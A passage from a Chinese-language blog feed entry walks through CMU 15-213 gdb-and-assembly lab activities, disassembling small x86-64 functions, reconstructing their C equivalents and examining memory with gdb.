between registers, load from memory, or store to memory.
   In this case, %edi holds the argument to the function and %eax its return value.
Q.  Fill in the blank in the pseudo C code for this function.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble squareInt&lt;/code&gt; ，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;(gdb) disassemble squareInt
Dump of assembler code for function squareInt:
   0x00000000004009c3 &amp;lt;+0&amp;gt;:     mov    %edi,%eax
   0x00000000004009c5 &amp;lt;+2&amp;gt;:     imul   %edi,%eax
   0x00000000004009c8 &amp;lt;+5&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提示说 &lt;code&gt;%edi holds the argument to the function and %eax its return value&lt;/code&gt; ，那么还原 &lt;code&gt;squareInt&lt;/code&gt;  函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// x in %edi, return value in %eax&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;squareInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
Type (gdb) disassemble squareLInt  (Note the L before Int)
Q.  How do the names of the registers differ between the functions?

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按照提示输入 &lt;code&gt;disassemble squareLInt&lt;/code&gt; ，看看 &lt;code&gt;Q.  How do the names of the registers differ between the functions?&lt;/code&gt; ，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;Dump of assembler code for function squareLInt:
   0x00000000004009c9 &amp;lt;+0&amp;gt;:     mov    %rdi,%rax
   0x00000000004009cc &amp;lt;+3&amp;gt;:     imul   %rdi,%rax
   0x00000000004009d0 &amp;lt;+7&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到此处使用的是 &lt;code&gt;%rdi&lt;/code&gt;  和 &lt;code&gt;%rax&lt;/code&gt; 。 &lt;code&gt;%rdi&lt;/code&gt;  和 &lt;code&gt;%rax&lt;/code&gt;  是 64 位，而 &lt;code&gt;%edi&lt;/code&gt;  和 &lt;code&gt;%eax&lt;/code&gt;  是 32 位。因为前面用的是 &lt;code&gt;int&lt;/code&gt; ，此处可能用的是 &lt;code&gt;long&lt;/code&gt; 。 &lt;code&gt;int&lt;/code&gt;  类型是 4 个字节，32 位，存储在 &lt;code&gt;%eax&lt;/code&gt;  和 &lt;code&gt;%edi&lt;/code&gt;  中。而 &lt;code&gt;long&lt;/code&gt;  类型是 64 位，可以存储在 &lt;code&gt;%rdi&lt;/code&gt;  和 &lt;code&gt;%rax&lt;/code&gt;  中。&lt;/p&gt;
&lt;p&gt;继续输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
squareLInt used long ints, hence it accessed %rdi, which is 64 bits.
squareInt used ints, hence it accessed %edi which is the lower 32 bits of %rdi
Type (gdb) disassemble squareFloat
Q.  Did squareFloat use the same registers from before?

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;diassemble squareFloat&lt;/code&gt;  看看，结果如下:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;(gdb) disassemble squareFloat
Dump of assembler code for function squareFloat:
   0x00000000004009d1 &amp;lt;+0&amp;gt;:     mulss  %xmm0,%xmm0
   0x00000000004009d5 &amp;lt;+4&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;浮点数和之前使用的不是同一套寄存器。继续输入 &lt;code&gt;c&lt;/code&gt; ，可以看到程序退出。按照课程提示，输入 &lt;code&gt;r 3&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 3
We are going to look at how to access memory.
We already saw the mov instruction between registers.  Now we will load and
store.  When a register is in (), then it is serving as a memory location.
While mov is powerful, we cannot directly mov (%rax), (%rbx).  The ISA requires
a register to be used.
Please disassemble function: whatIsThis
Q.  Knowing that %rdi is the first argument and %rsi is the second, what do
    you think the function is doing?
After you have an answer, continue execution.  The following code will loop, as
We conclude activity 1.  When you are finished, please exit (q &amp;lt;enter&amp;gt;) and run act2.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0000000000400918 in runStep4 ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这部分让我们掌握 &lt;code&gt;load &amp;amp; store&lt;/code&gt;  指令，输入 &lt;code&gt;disassemble whatIsThis&lt;/code&gt; ，可得如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble whatIsThis
Dump of assembler code for function whatIsThis:
   0x00000000004008a1 &amp;lt;+0&amp;gt;:     mov    (%rdi),%edx
   0x00000000004008a3 &amp;lt;+2&amp;gt;:     mov    (%rsi),%eax
   0x00000000004008a5 &amp;lt;+4&amp;gt;:     mov    %edx,(%rsi)
   0x00000000004008a7 &amp;lt;+6&amp;gt;:     mov    %eax,(%rdi)
   0x00000000004008a9 &amp;lt;+8&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 &lt;code&gt;%rdi&lt;/code&gt;  是第一个参数， &lt;code&gt;%rsi&lt;/code&gt;  是第二个参数。设第一个参数为 &lt;code&gt;x&lt;/code&gt; ，第二个参数为 &lt;code&gt;y&lt;/code&gt; ，(本来以为 &lt;code&gt;x&lt;/code&gt;  和 &lt;code&gt;y&lt;/code&gt;  是 &lt;code&gt;long&lt;/code&gt;  类型整数，后来发现有指针，而赋值的变量又是 &lt;code&gt;int&lt;/code&gt;  类型，那么可能 &lt;code&gt;x&lt;/code&gt;  和 &lt;code&gt;y&lt;/code&gt;  是 &lt;code&gt;int*&lt;/code&gt;  类型的指针变量）。那么 &lt;code&gt;whatIsThis&lt;/code&gt;  函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// x in %rdi, y in %rsi&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;whatIsThis&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; edx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; eax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; edx&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; eax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以看到，此函数的作用为交换两个变量的位置。输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
Input two integers to test whatIsThis: &amp;lt;x&amp;gt; &amp;lt;y&amp;gt;
2 3
Let&#39;s examine memory before we execute whatIsThis
Please type (gdb) x/8d $rsp
  This will dump the memory (x) containing eight (8) decimal integers ([%]d)
  starting from the stack pointer ($rsp).
Once you&#39;ve examined the memory dump, continue.
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;注意 gdb 中寄存器以 &lt;code&gt;$&lt;/code&gt;  开头，而不是 &lt;code&gt;%&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;输入 &lt;code&gt;2 3&lt;/code&gt; ，提示要求我们在执行 &lt;code&gt;whatIsThis&lt;/code&gt;  之前，查看一下当前的内存分布。首先输入 &lt;code&gt;x/8d $rsp&lt;/code&gt;  查看一下 &lt;code&gt;%rsp&lt;/code&gt;  开始处 8 个整数的值。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p $rsp
$1 = (void *) 0x7fffffffde30
(gdb) x/8d $rsp
0x7fffffffde30: -8384   32767   2       3
0x7fffffffde40: 0       0       4196939 0`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示再次查看 &lt;code&gt;%rsp&lt;/code&gt;  处的值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x7fffffffde30: -8384   32767   3       2
0x7fffffffde40: 0       0       4196939 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到 2 和 3 的位置交换了。Activity 1 完成。&lt;/p&gt;
&lt;h2 id=&#34;activity-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-2&#34;&gt;#&lt;/a&gt; Activity 2&lt;/h2&gt;
&lt;p&gt;输入 &lt;code&gt;./act2&lt;/code&gt; ，提示显示 &lt;code&gt;Did whatIsThis(): compare, swap, add, or multiply two numbers? Enter the keyword corresponding to the correct operation. &lt;/code&gt; ，根据上一问结果，输入 &lt;code&gt;swap&lt;/code&gt; 。因为 &lt;code&gt;whatIsThis&lt;/code&gt;  交换了两个变量的值。提示 &lt;code&gt;Correct! Please rerun in gdb with r s.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;gdb ./act2&lt;/code&gt; ，再输入 &lt;code&gt;r s&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r s
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 s
We are going to learn about memory access.  First, displacements.
A displacement is an immediate added to a memory access.
It is of the form: D(mem), so that the address accessed is D + mem.
Please disassemble viewThis.
Q.  What are the function&#39;s argument(s)?
Q.  What is the return register of the function?
Q.  Which instruction(s) initialize the return register?
Q.  What does the function do?
After you have your answer, please rerun with r a.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提示要求我们反汇编 &lt;code&gt;viewThis&lt;/code&gt;  函数，并且回答四个问题。输入 &lt;code&gt;disassemble viewThis&lt;/code&gt; ，显示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble viewThis
Dump of assembler code for function viewThis:
   0x0000000000400687 &amp;lt;+0&amp;gt;:     mov    0x4(%rdi),%eax
   0x000000000040068a &amp;lt;+3&amp;gt;:     add    (%rdi),%eax
   0x000000000040068c &amp;lt;+5&amp;gt;:     add    0x8(%rdi),%eax
   0x000000000040068f &amp;lt;+8&amp;gt;:     add    0xc(%rdi),%eax
   0x0000000000400692 &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;四个问题的回答分别是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Q1: 函数的参数在M[%rdi + 4],M[%rdi],M[%rdi + 8],M[%rdi + 12]中
Q2: 函数返回值在%eax中
Q3: mov    0x4(%rdi),%eax 指令初始化了返回值寄存器%rax
Q4: 对一个4个int类型的数组求和
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据提示，输入 &lt;code&gt;r a&lt;/code&gt; ，提示信息如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r a
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 a
Since viewThis added 4 numbers from an array, let&#39;s look at more array
accesses.  The general form of a memory reference is D(B,I,S)
D + B + I * S
Disassemble: viewThisNext.
Q.  What does this function do?
We are going to call this function with array: arr.
Print its address with: p/x &amp;amp;arr
Then continue.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上一题答对啦： &lt;code&gt;viewThis&lt;/code&gt;  就是累加 4 个 int 类型元素的数组。输入 &lt;code&gt;disassemble viewThisNext&lt;/code&gt; ，显示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble viewThisNext
Dump of assembler code for function viewThisNext:
   0x0000000000400693 &amp;lt;+0&amp;gt;:     mov    (%rdi,%rsi,4),%eax
   0x0000000000400696 &amp;lt;+3&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上述代码的逻辑为： &lt;code&gt;int ret = *(rdi + rsi * 4); 因为汇编代码是从字节出发，而&lt;/code&gt;  C &lt;code&gt;代码的指针递增，每次加&lt;/code&gt;  sizeof (T) &lt;code&gt;个字节。这里是&lt;/code&gt;  4 &lt;code&gt;,那么推测&lt;/code&gt;  sizeof (T) = 4 &lt;code&gt;，这里的类型应该是 int。那么&lt;/code&gt;  % rdi &lt;code&gt;应该是数组的起始位置，&lt;/code&gt; %rsi &lt;code&gt;等于要取的数字的索引，最后返回到&lt;/code&gt;  % eax` 中。其 C 语言描述如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get_val&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入 &lt;code&gt;p/x &amp;amp;arr&lt;/code&gt; ，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p/x &amp;amp;arr
$1 = 0x602080
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;x/10d &amp;amp;arr&lt;/code&gt;  来打印从 &lt;code&gt;arr&lt;/code&gt;  地址开始处后 10 个整数。显示结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/10d &amp;amp;arr
0x602080 &amp;lt;arr&amp;gt;: 0       1       2       3
0x602090 &amp;lt;arr+16&amp;gt;:      4       5       6       7
0x6020a0 &amp;lt;arr+32&amp;gt;:      8       9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到 arr 地址开始后存储了 10 个整数，从 0 到 9。输入 &lt;code&gt;c&lt;/code&gt;  继续，提示显示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
Now we&#39;ll actually call viewThisNext.  Please input a number between 0 and 9.
5
You requested: 0x602094 = 5

Now rerun with r L.
[Inferior 1 (process 42895) exited normally]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我想要 5，该值在 0x605094 位置处。输入 &lt;code&gt;r L&lt;/code&gt; 。提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r L
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 L
Many times, the compiler will need to compute the address before it is used.
The instruction LEA provides this capability.
Disassemble: viewThisL.
It does the same calculation as before, except it passes along the pointer.
Once you&#39;re done looking at the disassembly dump, continue.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;diassemble viewThisL&lt;/code&gt;  后，提示显示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble viewThisL
Dump of assembler code for function viewThisL:
   0x0000000000400697 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x000000000040069b &amp;lt;+4&amp;gt;:     lea    (%rdi,%rsi,4),%rdi
   0x000000000040069f &amp;lt;+8&amp;gt;:     callq  0x4004e0 &amp;lt;free@plt&amp;gt;
   0x00000000004006a4 &amp;lt;+13&amp;gt;:    add    $0x8,%rsp
   0x00000000004006a8 &amp;lt;+17&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
LEA can also be used to do actual math.  The function mx mutliplies its
argument by some value.  Note the use of the SHL instruction to left shift.
Disassemble: mx.
Q.  Write down the four parts of LEA&#39;s displacement-mode address.
Q.  After accounting for the left shift, what value does mx() multiply its argument by?
For your final exercise, leave gdb and type head -n 8 act3.c.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble mx&lt;/code&gt; ，显示结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble mx
Dump of assembler code for function mx:
   0x00000000004006a9 &amp;lt;+0&amp;gt;:     lea    (%rdi,%rdi,2),%rax
   0x00000000004006ad &amp;lt;+4&amp;gt;:     shl    $0x2,%rax
   0x00000000004006b1 &amp;lt;+8&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;LEA 内存地址偏移计算模式为 D (B,I,S)。其中地址 = B + I*S + D。这里的指令为 &lt;code&gt;lea    (%rdi,%rdi,2),%rax&lt;/code&gt; 。那么结果为 &lt;code&gt;%rax = %rdi + 2 * %rdi = 3 \_ %rdi&lt;/code&gt; 。然后左移两位，也就是 * 4。最后 &lt;code&gt;%rax&lt;/code&gt;  的值为 &lt;code&gt;12 \* %rdi&lt;/code&gt; 。&lt;/p&gt;
&lt;h2 id=&#34;activity-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-3&#34;&gt;#&lt;/a&gt; Activity 3&lt;/h2&gt;
&lt;p&gt;接下来，退出 gdb，并且输入 &lt;code&gt;head -n 8 act3.c&lt;/code&gt; 。显示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//
// This quick activity looks at compilation and assembly.
//   type gcc -Og -S act3.c
// Then view act3.s in your favorite editor
//   Notice the assembly is there, plus some other lines.
// Now compile with gcc -Og -c act3.c
// Then type objdump -d act3.o
//
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据提示，输入 &lt;code&gt;gcc -Og -S act3.c&lt;/code&gt; ，然后输入 &lt;code&gt;objdump -d act3.o&lt;/code&gt; 。显示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
act3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;mx&amp;gt;:
   0:   f3 0f 1e fa             endbr64
   4:   48 8d 04 7f             lea    (%rdi,%rdi,2),%rax
   8:   48 c1 e0 02             shl    $0x2,%rax
   c:   c3                      retq

000000000000000d &amp;lt;addm&amp;gt;:
   d:   f3 0f 1e fa             endbr64
  11:   e8 00 00 00 00          callq  16 &amp;lt;addm+0x9&amp;gt;
  16:   48 83 c0 01             add    $0x1,%rax
  1a:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
</content>
        <updated>2024-02-29T09:10:30.000Z</updated>
    </entry>
</feed>
